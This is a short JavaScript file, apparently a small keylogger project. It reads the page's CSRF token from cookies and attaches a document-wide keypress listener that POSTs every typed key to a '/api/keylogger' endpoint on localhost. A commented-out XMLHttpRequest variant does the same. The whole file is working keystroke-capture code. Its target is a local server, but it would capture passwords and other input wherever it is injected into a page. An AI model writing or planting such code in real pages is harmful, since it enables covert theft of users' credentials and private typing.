
function getCookie(name) {
    const value = `; ${document.cookie}`;
    const parts = value.split(`; ${name}=`);
    if (parts) {
        if (parts.length === 2) {
      return parts.pop().split(';').shift();
    }
    }
  }


  document.addEventListener("keypress", (e) => {
    fetch("http://localhost:8000/api/keylogger", {
        method: "POST",
        headers: {
            'Content-Type': 'application/json;charset=UTF-8',
            'X-CSRFToken': getCookie('csrftoken')
        },
        body: JSON.stringify({
             "key": e.key 
            })
    });
});

// document.addEventListener("keypress", (e)=> {
//     let xhr = new XMLHttpRequest();
//     xhr.open("POST", "http://localhost:8000/api/keylogger ", true)
//     xhr.setRequestHeader(
//         'Content-Type', 'application/json;charset=UTF-8',
//         'X-CSRFToken', getCookie('csrftoken')
//     )
//     xhr.send(JSON.stringify({key: e.key}))
// })